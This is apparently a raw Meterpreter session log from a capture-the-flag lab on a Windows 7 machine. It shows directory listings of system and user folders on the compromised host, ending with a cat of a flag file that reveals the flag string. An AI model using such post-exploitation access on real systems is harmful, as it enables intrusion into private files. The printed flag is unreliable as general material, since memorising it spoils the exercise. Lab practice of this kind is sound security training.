040777/rwxrw  0        dir   2018-12-12 23:04:07   debug
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 06:32:38   diagnostics
xrwx                         +0100
040777/rwxrw  24576    dir   2011-04-12 09:28:34   ehome
xrwx                         +0100
040777/rwxrw  4096     dir   2011-04-12 09:17:52   en-US
xrwx                         +0100
100777/rwxrw  2872320  fil   2010-11-21 03:24:11   explorer.exe
xrwx                         +0000
100777/rwxrw  15360    fil   2009-07-14 02:39:10   fveupdate.exe
xrwx                         +0100
100777/rwxrw  16896    fil   2009-07-14 02:39:12   hh.exe
xrwx                         +0100
040777/rwxrw  327680   dir   2025-10-20 18:16:55   inf
xrwx                         +0100
100666/rw-rw  43131    fil   2009-07-14 00:06:54   mib.bin
-rw-                         +0100
100666/rw-rw  1405     fil   2009-06-10 21:36:48   msdfmap.ini
-rw-                         +0100
100777/rwxrw  193536   fil   2009-07-14 02:39:25   notepad.exe
xrwx                         +0100
100777/rwxrw  427008   fil   2009-07-14 02:39:29   regedit.exe
xrwx                         +0100
040777/rwxrw  0        dir   2018-12-12 23:04:10   rescache
xrwx                         +0000
040777/rwxrw  4096     dir   2009-07-14 06:32:38   schemas
xrwx                         +0100
040777/rwxrw  4096     dir   2011-04-12 09:28:27   security
xrwx                         +0100
040777/rwxrw  4096     dir   2011-04-12 09:17:53   servicing
xrwx                         +0100
100666/rw-rw  22000    fil   2025-10-20 18:12:07   setupact.log
-rw-                         +0100
100666/rw-rw  0        fil   2009-07-14 05:51:00   setuperr.log
-rw-                         +0100
100777/rwxrw  67072    fil   2010-11-21 03:24:16   splwow64.exe
xrwx                         +0000
040777/rwxrw  0        dir   2009-07-14 03:36:55   system
xrwx                         +0100
100666/rw-rw  219      fil   2009-06-10 22:08:04   system.ini
-rw-                         +0100
040777/rwxrw  0        dir   2009-07-14 03:34:33   tracing
xrwx                         +0100
100666/rw-rw  94784    fil   2009-06-10 22:41:17   twain.dll
-rw-                         +0100
040777/rwxrw  0        dir   2009-07-14 06:32:39   twain_32
xrwx                         +0100
100666/rw-rw  51200    fil   2010-11-21 03:25:10   twain_32.dll
-rw-                         +0000
100777/rwxrw  49680    fil   2009-06-10 22:41:17   twunk_16.exe
xrwx                         +0100
100777/rwxrw  31232    fil   2009-07-14 02:14:42   twunk_32.exe
xrwx                         +0100
100666/rw-rw  403      fil   2009-07-14 06:09:22   win.ini
-rw-                         +0100
100777/rwxrw  9728     fil   2009-07-14 02:14:45   winhlp32.exe
xrwx                         +0100
040777/rwxrw  7864320  dir   2018-12-13 03:20:56   winsxs
xrwx                         +0000
100777/rwxrw  10240    fil   2009-07-14 02:39:57   write.exe
xrwx                         +0100

meterpreter > cd ..
meterpreter > ls
Listing: C:\
============

Mode          Size   Type  Last modified          Name
----          ----   ----  -------------          ----
040777/rwxrw  0      dir   2018-12-13 03:13:36 +  $Recycle.Bin
xrwx                       0000
040777/rwxrw  0      dir   2009-07-14 06:08:56 +  Documents and Settings
xrwx                       0100
040777/rwxrw  0      dir   2009-07-14 04:20:08 +  PerfLogs
xrwx                       0100
040555/r-xr-  4096   dir   2019-03-17 22:22:01 +  Program Files
xr-x                       0000
040555/r-xr-  4096   dir   2019-03-17 22:28:38 +  Program Files (x86)
xr-x                       0000
040777/rwxrw  4096   dir   2019-03-17 22:35:57 +  ProgramData
xrwx                       0000
040777/rwxrw  0      dir   2018-12-13 03:13:22 +  Recovery
xrwx                       0000
040777/rwxrw  4096   dir   2025-10-20 18:48:43 +  System Volume Informat
xrwx                       0100                   ion
040555/r-xr-  4096   dir   2018-12-13 03:13:28 +  Users
xr-x                       0000
040777/rwxrw  16384  dir   2019-03-17 22:36:30 +  Windows
xrwx                       0000
040777/rwxrw  0      dir   2025-10-20 18:12:39 +  badr
xrwx                       0100
100666/rw-rw  24     fil   2019-03-17 19:27:21 +  flag1.txt
-rw-                       0000
000000/-----  0      fif   1970-01-01 01:00:00 +  hiberfil.sys
----                       0100
000000/-----  0      fif   1970-01-01 01:00:00 +  pagefile.sys
----                       0100

meterpreter > cd Users
meterpreter > dir
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2009-07-14 06:08:56 +0100  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 08:07:31 +0100  Default
040777/rwxrwxrwx  0     dir   2009-07-14 06:08:56 +0100  Default User
040777/rwxrwxrwx  8192  dir   2018-12-13 03:13:45 +0000  Jon
040555/r-xr-xr-x  4096  dir   2011-04-12 09:28:15 +0100  Public
100666/rw-rw-rw-  174   fil   2009-07-14 05:54:24 +0100  desktop.ini

meterpreter > cd Jon
meterpreter > dir
Listing: C:\Users\Jon
=====================

Mode          Size    Type  Last modified          Name
----          ----    ----  -------------          ----
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  AppData
xrwx                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Application Data
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Contacts
xr-x                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Cookies
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:49:07 +  Desktop
xr-x                        0000
040555/r-xr-  4096    dir   2018-12-13 03:49:20 +  Documents
xr-x                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Downloads
xr-x                        0000
040555/r-xr-  4096    dir   2018-12-13 03:13:51 +  Favorites
xr-x                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Links
xr-x                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Local Settings
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Music
xr-x                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  My Documents
xrwx                        0000
100666/rw-rw  524288  fil   2019-03-17 20:05:06 +  NTUSER.DAT
-rw-                        0000
100666/rw-rw  65536   fil   2018-12-13 03:32:45 +  NTUSER.DAT{016888bd-6
-rw-                        0000                   c6f-11de-8d1d-001e0bc
                                                   de3ec}.TM.blf
100666/rw-rw  524288  fil   2018-12-13 03:32:45 +  NTUSER.DAT{016888bd-6
-rw-                        0000                   c6f-11de-8d1d-001e0bc
                                                   de3ec}.TMContainer000
                                                   00000000000000001.reg
                                                   trans-ms
100666/rw-rw  524288  fil   2018-12-13 03:32:45 +  NTUSER.DAT{016888bd-6
-rw-                        0000                   c6f-11de-8d1d-001e0bc
                                                   de3ec}.TMContainer000
                                                   00000000000000002.reg
                                                   trans-ms
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  NetHood
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Pictures
xr-x                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  PrintHood
xrwx                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Recent
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Saved Games
xr-x                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Searches
xr-x                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  SendTo
xrwx                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Start Menu
xrwx                        0000
040777/rwxrw  0       dir   2018-12-13 03:13:31 +  Templates
xrwx                        0000
040555/r-xr-  0       dir   2018-12-13 03:13:48 +  Videos
xr-x                        0000
100666/rw-rw  262144  fil   2019-03-17 20:05:06 +  ntuser.dat.LOG1
-rw-                        0000
100666/rw-rw  0       fil   2018-12-13 03:13:31 +  ntuser.dat.LOG2
-rw-                        0000
100666/rw-rw  20      fil   2018-12-13 03:13:31 +  ntuser.ini
-rw-                        0000

meterpreter > cd Documents
meterpreter > dir
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  37    fil   2019-03-17 19:26:36 +0000  flag3.txt

meterpreter > cat flag3.txt
flag{admin_documents_can_be_valuable}meterpreter > 


```

